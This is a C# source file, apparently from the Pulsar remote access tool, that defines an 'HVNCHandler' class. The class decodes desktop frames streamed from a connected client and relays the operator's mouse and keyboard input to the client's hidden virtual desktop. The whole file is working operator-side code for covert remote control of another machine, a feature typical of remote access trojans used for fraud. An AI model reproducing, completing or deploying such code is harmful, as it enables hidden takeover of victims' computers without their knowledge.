using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.Video.Codecs;
using Pulsar.Server.Networking;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using Pulsar.Common.Messages.Monitoring.HVNC;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote desktop.
    /// </summary>
    public class HVNCHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming desktop frames.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// Gets or sets whether the remote desktop is using buffered mode.
        /// </summary>
        public bool IsBufferedMode { get; set; } = true;

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _sizeLock = new object();

        /// <summary>
        /// The local resolution, see <seealso cref="LocalResolution"/>.
        /// </summary>
        private Size _localResolution;

        /// <summary>
        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
        /// </summary>
        /// <remarks>
        /// This property is thread-safe.
        /// </remarks>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        /// <summary>
        /// Represents the method that will handle display changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="value">All currently available displays.</param>
        public delegate void DisplaysChangedEventHandler(object sender, int value);

        /// <summary>
        /// The client which is associated with this remote desktop handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The video stream codec used to decode received frames.
        /// </summary>
        private UnsafeStreamCodec _codec;

        // buffer parameters
        private readonly int _initialFramesRequested = 5; // request 5 frames initially
        private readonly int _defaultFrameRequestBatch = 3;
        private int _pendingFrames = 0;
        private readonly SemaphoreSlim _frameRequestSemaphore = new SemaphoreSlim(1, 1);
        private readonly Stopwatch _frameReceiptStopwatch = new Stopwatch();
        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
        private readonly int _fpsCalculationWindow = 10; // calculate FPS based on last 10 frames

        private DateTime _lastFrameRequest = DateTime.MinValue;

        private readonly Stopwatch _performanceMonitor = new Stopwatch();
        private int _framesReceived = 0;
        private double _estimatedFps = 0;

        private long _accumulatedFrameBytes = 0;
        private int _frameBytesSamples = 0;
        private long _lastFrameBytes = 0;

        private bool _disposed;

        public long LastFrameSizeBytes => Interlocked.Read(ref _lastFrameBytes);
        public double AverageFrameSizeBytes
        {
            get
            {
                long total = Interlocked.Read(ref _accumulatedFrameBytes);
                int count = Volatile.Read(ref _frameBytesSamples);
                return count > 0 ? (double)total / count : 0.0;
            }
        }
        /// <summary>
        /// Stores the last FPS reported by the client.
        /// </summary>
        private float _lastReportedFps = -1f;

        /// <summary>
        /// Shows the last FPS reported by the client, or estimated FPS if not available.
        /// </summary>
        public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;

        /// <summary>
        /// Shows the estimated frames per second (FPS) based on the last second of received frames.
        /// </summary>
        public float LastReportedFps => _lastReportedFps;

        public static Size resolution = new Size(0, 0);

        /// <summary>
        /// Initializes a new instance of the <see cref="RemoteDesktopHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public HVNCHandler(Client client) : base(true)
        {
            _client = client;
            _performanceMonitor.Start();
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetHVNCDesktopResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetHVNCDesktopResponse response:
                    Execute(sender, response);
                    break;
            }
        }

        private async void Execute(ISender client, GetHVNCDesktopResponse message)
        {
            _framesReceived++;

            resolution = new Size { Height = message.Resolution.Height, Width = message.Resolution.Width };

            // capture the FPS reported by the client
            if (message.Fps > 0)
            {
                _lastReportedFps = message.Fps;
                Debug.WriteLine($"Client-reported FPS: {_lastReportedFps}");
            }

            if (_performanceMonitor.ElapsedMilliseconds >= 1000)
            {
                _estimatedFps = _framesReceived / (_performanceMonitor.ElapsedMilliseconds / 1000.0);
                Debug.WriteLine($"Estimated FPS: {_estimatedFps:F1}, Frames received: {_framesReceived}");
                _framesReceived = 0;
                _performanceMonitor.Restart();
            }

            lock (_syncLock)
            {
                if (!IsStarted)
                    return;

                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                {
                    _codec?.Dispose();
                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                }

                if (message.Image != null)
                {
                    long size = message.Image.LongLength;
                    Interlocked.Exchange(ref _lastFrameBytes, size);
                    Interlocked.Add(ref _accumulatedFrameBytes, size);
                    Interlocked.Increment(ref _frameBytesSamples);
                }

                using (var ms = new MemoryStream(message.Image))
                {
                    try
                    {
                        var decoded = _codec.DecodeData(ms);
                        if (decoded != null)
                        {
                            EnsureLocalResolutionInitialized(decoded.Size);
                            OnReport(decoded);
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error decoding frame: {ex.Message}");
                    }
                }

                message.Image = null;

                long timestamp = message.Timestamp;
                _frameTimestamps.Enqueue(timestamp);
                while (_frameTimestamps.Count > _fpsCalculationWindow && _frameTimestamps.TryDequeue(out _)) { }

                Interlocked.Decrement(ref _pendingFrames);
            }

            if (IsBufferedMode && (message.IsLastRequestedFrame || _pendingFrames <= 1))
            {
                await RequestMoreFramesAsync();
            }
        }

        private void EnsureLocalResolutionInitialized(Size fallbackSize)
        {
            if (fallbackSize.Width <= 0 || fallbackSize.Height <= 0)
            {
                return;
            }

            var current = LocalResolution;
            if (current.Width <= 0 || current.Height <= 0)
            {
                LocalResolution = fallbackSize;
            }
        }

        private void ClearTimeStamps()
        {
            while (_frameTimestamps.TryDequeue(out _)) { }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        /// <param name="quality">The quality of the remote desktop frames.</param>
        /// <param name="display">The display to receive frames from.</param>
        /// <param name="useGPU">Whether to use GPU for screen capture.</param>
        public void BeginReceiveFrames(int quality, int display, bool useGPU)
        {
            if (_disposed)
            {
                throw new ObjectDisposedException(nameof(HVNCHandler));
            }

            lock (_syncLock)
            {
                IsStarted = true;
                _codec?.Dispose();
                _codec = null;

                // Reset buffering counters
                _pendingFrames = _initialFramesRequested;
                ClearTimeStamps();
                _framesReceived = 0;
                _frameReceiptStopwatch.Restart();

                // Start in buffered mode
                _client.Send(new GetHVNCDesktop
                {
                    CreateNew = true,
                    Quality = quality,
                    DisplayIndex = display,
                    Status = RemoteDesktopStatus.Start,
                    UseGPU = useGPU,
                    IsBufferedMode = IsBufferedMode,
                    FramesRequested = _initialFramesRequested
                });
            }
        }

        /// <summary>
        /// Ends receiving frames from the client.
        /// </summary>
        public void EndReceiveFrames()
        {
            if (_disposed)
            {
                return;
            }

            lock (_syncLock)
            {
                IsStarted = false;
            }

            Debug.WriteLine("HVNC session stopped");

            _client.Send(new GetHVNCDesktop { Status = RemoteDesktopStatus.Stop });
        }

        /// <summary>
        /// States whether remote mouse input is enabled.
        /// </summary>
        private bool _enableMouseInput = true;

        /// <summary>
        /// States whether remote keyboard input is enabled.
        /// </summary>
        private bool _enableKeyboardInput = true;

        /// <summary>
        /// Gets or sets the maximum frames per second for HVNC stream.
        /// </summary>
        public int MaxFramesPerSecond { get; set; } = 30;

        /// <summary>
        /// Gets or sets whether adaptive frame rate is enabled (reduces FPS when form is processing slowly).
        /// </summary>
        public bool AdaptiveFrameRate { get; set; } = true;

        /// <summary>
        /// Gets or sets whether mouse input is enabled.
        /// </summary>
        public bool EnableMouseInput
        {
            get => _enableMouseInput;
            set => _enableMouseInput = value;
        }

        /// <summary>
        /// Gets or sets whether keyboard input is enabled.
        /// </summary>
        public bool EnableKeyboardInput
        {
            get => _enableKeyboardInput;
            set => _enableKeyboardInput = value;
        }

        /// <summary>
        /// Sends a mouse event to the client.
        /// </summary>
        /// <param name="message">The Windows message type (WM_LBUTTONDOWN, WM_MOUSEMOVE, etc.).</param>
        /// <param name="wParam">The wParam value.</param>
        /// <param name="lParam">The lParam value containing coordinates.</param>
        public void SendMouseEvent(uint message, int wParam, int lParam)
        {
            if (!_enableMouseInput || _disposed) return;

            lock (_syncLock)
            {
                if (!IsStarted) return;

                if (_codec != null && LocalResolution.Width > 0 && LocalResolution.Height > 0)
                {
                    int x = lParam & 0xFFFF;
                    int y = (lParam >> 16) & 0xFFFF;

                    int remoteX = x * _codec.Resolution.Width / LocalResolution.Width;
                    int remoteY = y * _codec.Resolution.Height / LocalResolution.Height;
                    lParam = (remoteY << 16) | (remoteX & 0xFFFF);
                }

                _client.Send(new DoHVNCInput
                {
                    msg = message,
                    wParam = wParam,
                    lParam = lParam
                });
            }
        }

        /// <summary>
        /// Sends a keyboard event to the client.
        /// </summary>
        /// <param name="message">The Windows message type (WM_KEYDOWN, WM_KEYUP, etc.).</param>
        /// <param name="wParam">The wParam value (virtual key code).</param>
        /// <param name="lParam">The lParam value.</param>
        public void SendKeyboardEvent(uint message, int wParam, int lParam)
        {
            if (!_enableKeyboardInput || _disposed) return;

            lock (_syncLock)
            {
                if (!IsStarted) return;

                _client.Send(new DoHVNCInput
                {
                    msg = message,
                    wParam = wParam,
                    lParam = lParam
                });
            }
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshDisplays()
        {
            Debug.WriteLine("Refreshing HVNC displays");
            // ts does nothing it just fits what remotedesktop does
        }

        private async Task RequestMoreFramesAsync()
        {
            bool acquired;
            try
            {
                acquired = await _frameRequestSemaphore.WaitAsync(0).ConfigureAwait(false);
            }
            catch (ObjectDisposedException)
            {
                return;
            }

            if (!acquired)
                return;

            try
            {
                if (_disposed)
                {
                    return;
                }

                int targetFps = MaxFramesPerSecond;

                if (AdaptiveFrameRate && _pendingFrames > 2)
                {
                    targetFps = Math.Max(15, targetFps / 2);
                    Debug.WriteLine($"Adaptive frame rate: reducing to {targetFps} FPS (pending frames: {_pendingFrames})");
                }

                int minIntervalMs = 1000 / Math.Max(1, targetFps);

                var timeSinceLastRequest = DateTime.Now - _lastFrameRequest;
                if (timeSinceLastRequest.TotalMilliseconds < minIntervalMs)
                {
                    int delayMs = minIntervalMs - (int)timeSinceLastRequest.TotalMilliseconds;
                    Debug.WriteLine($"Frame rate limiting: waiting {delayMs}ms (target: {targetFps} FPS)");
                    await Task.Delay(delayMs).ConfigureAwait(false);
                    if (_disposed)
                    {
                        return;
                    }
                }

                int batchSize = AdaptiveFrameRate && _pendingFrames > 1 ? 1 : _defaultFrameRequestBatch;

                Debug.WriteLine($"Requesting {batchSize} more frames (pending: {_pendingFrames})");
                Interlocked.Add(ref _pendingFrames, batchSize);
                _lastFrameRequest = DateTime.Now;

                if (!_disposed)
                {
                    _client.Send(new GetHVNCDesktop
                    {
                        CreateNew = false,
                        Quality = _codec?.ImageQuality ?? 75,
                        DisplayIndex = _codec?.Monitor ?? 0,
                        Status = RemoteDesktopStatus.Continue,
                        IsBufferedMode = true,
                        FramesRequested = batchSize
                    });
                }
            }
            catch (ObjectDisposedException)
            {
                // Ignore disposal races during shutdown.
            }
            finally
            {
                try
                {
                    _frameRequestSemaphore.Release();
                }
                catch (ObjectDisposedException)
                {
                }
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    _codec?.Dispose();
                    _disposed = true;
                    IsStarted = false;
                }
                try
                {
                    _frameRequestSemaphore.Dispose();
                }
                catch (ObjectDisposedException)
                {
                }
            }
        }
    }
}